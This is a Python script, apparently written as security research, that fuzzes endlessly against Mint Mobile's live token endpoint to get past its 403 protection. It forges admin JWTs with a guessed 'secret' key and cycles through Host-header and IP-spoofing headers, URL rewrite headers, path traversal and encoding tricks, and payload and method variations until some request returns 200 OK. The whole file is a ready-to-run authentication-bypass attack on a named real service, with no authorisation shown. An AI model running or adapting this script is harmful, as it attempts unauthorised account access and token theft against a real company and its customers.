#!/usr/bin/env python3
"""
Mint Mobile - AGGRESSIVE ENDLESS 403 BYPASS FUZZER
==================================================
Continuous fuzzing until we get 200 OK response

This script will try EVERY possible bypass technique in combinations
and won't stop until we find a working exploit.

Author: FlutterSentinel Security Research
"""

import requests
import jwt
import json
import itertools
import random
import time
from datetime import datetime, timedelta
from urllib.parse import quote, quote_plus
import string

JWT_SECRET = "secret"
BASE_URL = "https://my.mintmobile.com"
TARGET_ENDPOINT = "/api/token"

class EndlessBypassFuzzer:
    """
    Aggressive fuzzer that tries EVERYTHING until 200 OK
    """
    
    def __init__(self):
        self.attempts = 0
        self.session = requests.Session()
        self.session.max_redirects = 0
        self.found_200 = False
        
    def forge_jwt(self, phone="+15551234567", **claims):
        payload = {
            "msisdn": phone,
            "sub": phone,
            "iat": int(datetime.now().timestamp()),
            "exp": int((datetime.now() + timedelta(days=365)).timestamp()),
            **claims
        }
        return jwt.encode(payload, JWT_SECRET, algorithm="HS256")
    
    def test_request(self, method, url, headers=None, body=None, desc=""):
        """Test and log request"""
        self.attempts += 1
        
        try:
            if headers is None:
                headers = {}
            
            # Add auth
            token = self.forge_jwt(role="admin", isAdmin=True, permissions=["all"])
            headers.setdefault('Authorization', f'Bearer {token}')
            
            response = requests.request(
                method,
                url,
                headers=headers,
                json=body if body else None,
                timeout=5,
                allow_redirects=False,
                verify=False
            )
            
            status = response.status_code
            
            # Log every attempt
            if self.attempts % 100 == 0:
                print(f"[{self.attempts}] Still trying... Last: {status}")
            
            # SUCCESS!
            if status == 200:
                self.found_200 = True
                print(f"\n🎉🎉🎉 SUCCESS! GOT 200 OK! 🎉🎉🎉")
                print(f"[*] Method: {method}")
                print(f"[*] URL: {url}")
                print(f"[*] Headers: {json.dumps(headers, indent=2)}")
                print(f"[*] Body: {json.dumps(body, indent=2)}")
                print(f"[*] Description: {desc}")
                print(f"\n[*] RESPONSE:")
                print(response.text[:1000])
                
                # Save success
                with open('SUCCESS_200_BYPASS.json', 'w') as f:
                    json.dump({
                        'method': method,
                        'url': url,
                        'headers': dict(headers),
                        'body': body,
                        'description': desc,
                        'response': response.text,
                        'attempts': self.attempts
                    }, f, indent=2)
                
                return True
            
            # Interesting non-403 responses
            if status not in [403, 401, 405, 400]:
                print(f"\n[!] INTERESTING: {status} - {desc}")
                print(f"    URL: {url}")
                print(f"    Response: {response.text[:200]}")
            
            return False
            
        except Exception as e:
            if self.attempts % 1000 == 0:
                print(f"[{self.attempts}] Error: {e}")
            return False
    
    def fuzz_host_headers(self):
        """Host header injection attacks"""
        print("\n[*] Fuzzing Host headers...")
        
        hosts = [
            "localhost",
            "127.0.0.1",
            "127.0.0.1:80",
            "127.0.0.1:443",
            "0.0.0.0",
            "my.mintmobile.com",
            "mintmobile.com",
            "api.mintmobile.com",
            "internal.mintmobile.com",
            "admin.mintmobile.com",
            "staging.mintmobile.com",
            "dev.mintmobile.com",
        ]
        
        for host in hosts:
            headers = {"Host": host}
            if self.test_request("POST", f"{BASE_URL}{TARGET_ENDPOINT}", headers=headers, 
                               body={"autoLoginToken": self.forge_jwt()}, desc=f"Host: {host}"):
                return True
        return False
    
    def fuzz_origin_referer(self):
        """Origin and Referer manipulation"""
        print("\n[*] Fuzzing Origin/Referer...")
        
        origins = [
            "http://localhost",
            "https://localhost",
            "https://my.mintmobile.com",
            "https://mintmobile.com",
            "https://admin.mintmobile.com",
            "null",
            "",
        ]
        
        for origin in origins:
            for referer in origins:
                headers = {
                    "Origin": origin,
                    "Referer": referer,
                }
                if self.test_request("POST", f"{BASE_URL}{TARGET_ENDPOINT}", headers=headers,
                                   body={"autoLoginToken": self.forge_jwt()}, 
                                   desc=f"Origin/Referer: {origin}/{referer}"):
                    return True
        return False
    
    def fuzz_content_headers(self):
        """Content-Type and Accept variations"""
        print("\n[*] Fuzzing Content headers...")
        
        content_types = [
            "application/json",
            "application/x-www-form-urlencoded",
            "multipart/form-data",
            "text/plain",
            "text/xml",
            "application/xml",
            "application/json; charset=utf-8",
            "application/json;charset=UTF-8",
            "",
        ]
        
        accept_types = [
            "application/json",
            "*/*",
            "text/html",
            "application/xml",
            "",
        ]
        
        for ct in content_types:
            for accept in accept_types:
                headers = {
                    "Content-Type": ct,
                    "Accept": accept,
                }
                if ct:  # Only add if not empty
                    if self.test_request("POST", f"{BASE_URL}{TARGET_ENDPOINT}", headers=headers,
                                       body={"autoLoginToken": self.forge_jwt()},
                                       desc=f"CT: {ct[:30]}"):
                        return True
        return False
    
    def fuzz_http2_downgrade(self):
        """HTTP/2 to HTTP/1.1 downgrade attacks"""
        print("\n[*] Fuzzing HTTP version...")
        
        for version in ["HTTP/1.0", "HTTP/1.1", "HTTP/2.0", "HTTP/0.9"]:
            # Can't directly set HTTP version in requests, but we can try headers
            headers = {
                "Connection": "Upgrade, HTTP2-Settings",
                "Upgrade": "h2c",
                "HTTP2-Settings": "AAMAAABkAARAAAAAAAIAAAAA",
            }
            if self.test_request("POST", f"{BASE_URL}{TARGET_ENDPOINT}", headers=headers,
                               body={"autoLoginToken": self.forge_jwt()},
                               desc=f"HTTP version tricks"):
                return True
        return False
    
    def fuzz_cache_headers(self):
        """Cache control manipulation"""
        print("\n[*] Fuzzing Cache headers...")
        
        cache_variations = [
            {"Cache-Control": "no-cache"},
            {"Cache-Control": "no-store"},
            {"Cache-Control": "max-age=0"},
            {"Pragma": "no-cache"},
            {"If-None-Match": "*"},
            {"If-Modified-Since": "Wed, 01 Jan 2020 00:00:00 GMT"},
        ]
        
        for headers in cache_variations:
            if self.test_request("POST", f"{BASE_URL}{TARGET_ENDPOINT}", headers=headers,
                               body={"autoLoginToken": self.forge_jwt()},
                               desc=f"Cache: {list(headers.keys())}"):
                return True
        return False
    
    def fuzz_combined_advanced(self):
        """Advanced combination attacks"""
        print("\n[*] Advanced combination fuzzing...")
        
        # Massive combination attack
        methods = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"]
        
        combined_headers = {
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "X-Original-URL": TARGET_ENDPOINT,
            "X-Rewrite-URL": TARGET_ENDPOINT,
            "Host": "localhost",
            "Origin": "https://localhost",
            "Referer": "https://localhost",
            "X-Custom-IP-Authorization": "127.0.0.1",
            "X-Forwarded-Host": "127.0.0.1",
            "X-Forwarded-Proto": "https",
        }
        
        # Try all method combinations with combined headers
        for method in methods:
            # Full combined attack
            if self.test_request(method, f"{BASE_URL}{TARGET_ENDPOINT}", 
                               headers=combined_headers,
                               body={"autoLoginToken": self.forge_jwt()},
                               desc=f"Full combined: {method}"):
                return True
            
            # Try subsets
            for i in range(1, len(combined_headers)):
                subset_keys = random.sample(list(combined_headers.keys()), i)
                subset_headers = {k: combined_headers[k] for k in subset_keys}
                
                if self.test_request(method, f"{BASE_URL}{TARGET_ENDPOINT}",
                                   headers=subset_headers,
                                   body={"autoLoginToken": self.forge_jwt()},
                                   desc=f"Subset {i}: {method}"):
                    return True
        
        return False
    
    def fuzz_payload_variations(self):
        """Different payload formats"""
        print("\n[*] Fuzzing payload variations...")
        
        token = self.forge_jwt()
        
        payloads = [
            {"autoLoginToken": token},
            {"token": token},
            {"jwt": token},
            {"access_token": token},
            {"auth_token": token},
            {"loginToken": token},
            {"bearer": token},
            {"authorization": token},
            # Nested
            {"data": {"autoLoginToken": token}},
            {"auth": {"token": token}},
            # Array format
            {"autoLoginToken": [token]},
            # String encoded
            f"autoLoginToken={token}",
            # Multiple tokens
            {"autoLoginToken": token, "token": token, "jwt": token},
        ]
        
        for payload in payloads:
            if self.test_request("POST", f"{BASE_URL}{TARGET_ENDPOINT}",
                               body=payload,
                               desc=f"Payload: {str(payload)[:50]}"):
                return True
        return False
    
    def fuzz_url_variations(self):
        """Endless URL encoding variations"""
        print("\n[*] Fuzzing URL variations...")
        
        # Generate tons of path variations
        paths = []
        base = "/api/token"
        
        # Encoding variations
        for i in range(len(base)):
            # URL encode each character position
            encoded = base[:i] + quote(base[i]) + base[i+1:]
            paths.append(encoded)
            # Double encode
            encoded2 = base[:i] + quote(quote(base[i])) + base[i+1:]
            paths.append(encoded2)
        
        # Path traversal combinations
        traversals = ["/./../api/token", "/./api/token", "//api/token", "/api//token",
                     "/api/./token", "/api/../api/token"]
        paths.extend(traversals)
        
        # Special characters
        for char in ["?", "#", ";", "~", "*", "%20", "%00", "%0d%0a"]:
            paths.append(f"/api/token{char}")
            paths.append(f"/api{char}/token")
            paths.append(f"{char}/api/token")
        
        for path in paths:
            url = f"{BASE_URL}{path}"
            if self.test_request("POST", url,
                               body={"autoLoginToken": self.forge_jwt()},
                               desc=f"Path: {path}"):
                return True
        
        return False
    
    def fuzz_random_combinations(self, iterations=1000):
        """Random combination fuzzing"""
        print(f"\n[*] Random fuzzing {iterations} iterations...")
        
        methods = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE", "CONNECT"]
        
        all_headers = {
            "X-Forwarded-For": ["127.0.0.1", "localhost", "10.0.0.1", "192.168.1.1"],
            "X-Real-IP": ["127.0.0.1", "localhost"],
            "X-Original-URL": [TARGET_ENDPOINT, "/admin", "/internal"],
            "X-Rewrite-URL": [TARGET_ENDPOINT],
            "Host": ["localhost", "127.0.0.1", "my.mintmobile.com"],
            "Origin": ["https://localhost", "https://my.mintmobile.com", "null"],
            "Referer": ["https://localhost", "https://my.mintmobile.com"],
            "Content-Type": ["application/json", "text/plain", "application/xml"],
            "Accept": ["application/json", "*/*", "text/html"],
            "User-Agent": ["Mozilla/5.0", "Mint-Mobile-Android/8.0"],
            "X-Forwarded-Proto": ["https", "http"],
            "X-Forwarded-Host": ["localhost", "127.0.0.1"],
        }
        
        for i in range(iterations):
            # Random method
            method = random.choice(methods)
            
            # Random headers (2-5 headers)
            num_headers = random.randint(2, 5)
            headers = {}
            for _ in range(num_headers):
                header_name = random.choice(list(all_headers.keys()))
                header_value = random.choice(all_headers[header_name])
                headers[header_name] = header_value
            
            # Random path variation
            path_chars = ["", "/", "//", "/./", "/../", "%2f", "%00", "?", "#"]
            path = TARGET_ENDPOINT + random.choice(path_chars)
            
            url = f"{BASE_URL}{path}"
            
            if self.test_request(method, url, headers=headers,
                               body={"autoLoginToken": self.forge_jwt()},
                               desc=f"Random combo {i}"):
                return True
        
        return False
    
    def run_endless_fuzzing(self):
        """Run fuzzing endlessly until 200 OK"""
        print("""
╔══════════════════════════════════════════════════════════════════╗
║  ENDLESS 403 BYPASS FUZZER                                      ║
║  Will NOT stop until we get 200 OK                              ║
╚══════════════════════════════════════════════════════════════════╝
        """)
        
        print(f"[*] Target: {BASE_URL}{TARGET_ENDPOINT}")
        print(f"[*] Starting aggressive fuzzing...")
        print(f"[*] Press Ctrl+C to stop (but why would you?)\n")
        
        iteration = 1
        
        try:
            while not self.found_200:
                print(f"\n{'='*70}")
                print(f"FUZZING ITERATION #{iteration}")
                print(f"Total attempts so far: {self.attempts}")
                print(f"{'='*70}")
                
                # Run all fuzzing techniques
                techniques = [
                    ("Host Headers", self.fuzz_host_headers),
                    ("Origin/Referer", self.fuzz_origin_referer),
                    ("Content Headers", self.fuzz_content_headers),
                    ("HTTP/2 Tricks", self.fuzz_http2_downgrade),
                    ("Cache Headers", self.fuzz_cache_headers),
                    ("Combined Advanced", self.fuzz_combined_advanced),
                    ("Payload Variations", self.fuzz_payload_variations),
                    ("URL Variations", self.fuzz_url_variations),
                    ("Random Combos", lambda: self.fuzz_random_combinations(500)),
                ]
                
                for name, func in techniques:
                    if self.found_200:
                        break
                    print(f"\n[*] Trying: {name}")
                    if func():
                        print(f"\n🎉 SUCCESS WITH: {name}")
                        return True
                
                iteration += 1
                
                # Brief pause to avoid overwhelming the server
                if iteration % 10 == 0:
                    print(f"\n[*] Iteration {iteration} complete. Brief pause...")
                    time.sleep(2)
        
        except KeyboardInterrupt:
            print(f"\n\n[!] Stopped by user after {self.attempts} attempts")
            print(f"[!] No 200 OK found yet")
            return False
        
        return self.found_200


if __name__ == "__main__":
    print("[!] AGGRESSIVE FUZZING MODE")
    print("[!] This will try thousands of combinations until 200 OK\n")
    
    fuzzer = EndlessBypassFuzzer()
    success = fuzzer.run_endless_fuzzing()
    
    if success:
        print("\n" + "="*70)
        print("🚨 200 OK ACHIEVED! CHECK SUCCESS_200_BYPASS.json 🚨")
        print("="*70)
    else:
        print("\n[*] Fuzzing stopped")
        print(f"[*] Total attempts: {fuzzer.attempts}")
